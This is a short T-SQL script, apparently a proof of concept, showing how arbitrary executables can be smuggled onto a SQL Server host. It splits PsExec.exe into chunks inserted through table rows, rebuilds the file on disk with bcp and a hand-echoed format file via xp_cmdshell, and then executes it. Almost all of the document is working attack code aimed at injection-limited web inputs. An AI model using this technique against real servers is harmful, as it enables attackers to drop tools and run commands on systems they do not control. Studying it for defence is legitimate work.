USE TheAwesome
GO
-- proxy table for files to upload to the server
CREATE TABLE test
(
	col1 varbinary(max)
)
GO
SELECT  *
FROM    test
truncate table test

-- show the file to be uploaded length
SELECT	DATALENGTH(BinVal) as MaliciousFileLengthInBytes
FROM	OPENROWSET(BULK N'd:\PsExec.exe', SINGLE_BLOB) c(BinVal) 

-- this can go all in one row, but usually input is length limited on the webpage
-- so this demonstrates that it doesn't matter since we can insert multiple rows and then BCP them out
-- to recreate the file
INSERT INTO test(col1) 
SELECT	SUBSTRING(BinVal, 1, 100000)
FROM	OPENROWSET(BULK N'd:\PsExec.exe', SINGLE_BLOB) c(BinVal) 

INSERT INTO test(col1) 
SELECT	SUBSTRING(BinVal, 100001, 100000) 
FROM	OPENROWSET(BULK N'd:\PsExec.exe', SINGLE_BLOB) c(BinVal) 

INSERT INTO test(col1) 
SELECT	SUBSTRING(BinVal, 200001, 100000) 
FROM	OPENROWSET(BULK N'd:\PsExec.exe', SINGLE_BLOB) c(BinVal) 

INSERT INTO test(col1) 
SELECT	SUBSTRING(BinVal, 300001, 87776) 
FROM	OPENROWSET(BULK N'd:\PsExec.exe', SINGLE_BLOB) c(BinVal) 


-- create the format file
-- unfortunately this creates an 8byte prefix which screws up our export file reconstruction
exec xp_cmdshell 'bcp "TheAwesome.dbo.test" format nul -f "d:\testFF_notOK.fmt" -n -S zen\sql2016 -T'
-- so we have to write our own format file with ECHO
-- old school FTW! :)
exec xp_cmdshell 'echo 13.0>>d:\testFF.fmt'
exec xp_cmdshell 'echo ^1>>d:\testFF.fmt'
exec xp_cmdshell 'echo 1       SQLBINARY           0       0       ""   1     col1         "">>d:\testFF.fmt'

-- and then let's export the "malicious" file to disk 
exec xp_cmdshell 'bcp "select col1 from TheAwesome.dbo.test" queryout "d:\PsExec.exe" -f "d:\testFF.fmt" -S zen\sql2016 -T'
--run psexec to accept eula because otherwise it just blocks since it wants to show the UI
exec xp_cmdshell 'd:\PsExec.exe -accepteula'

exec xp_cmdshell 'd:\PsExec.exe ipconfig'
